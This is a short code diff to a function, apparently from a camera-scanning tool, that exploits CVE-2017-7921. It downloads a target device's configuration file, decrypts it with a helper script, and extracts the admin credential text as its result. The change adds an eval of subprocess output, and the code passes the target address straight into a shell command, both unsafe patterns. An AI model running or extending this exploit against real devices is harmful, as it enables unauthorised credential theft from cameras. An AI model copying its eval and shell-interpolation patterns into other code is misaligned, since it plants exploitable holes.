@@ -26,10 +26,10 @@ def cve_2017_7921(ip: str) -> list:
         rc = requests.get(config_url, timeout=20, verify=False, headers=headers)
         with open(f"{ip}-config", 'wb') as f:
             f.write(rc.content)
-        info = os.popen(f"python3 scan/lib/decrypt_configure.py {ip}-config").readlines()
-        os.remove(f"{ip}-config")
-        idx = info[::-1].index('admin')
+        info = eval(os.popen(f"python3 scan/lib/decrypt_configure.py {ip}-config").readline().strip())
+        idx = - info[::-1].index('admin')
         info = info[idx - 1: ]
+        os.remove(f"{ip}-config")
         return [True, 'cve-2017-7921', str(info)]
     return [False, 'cve-2017-7921']
 
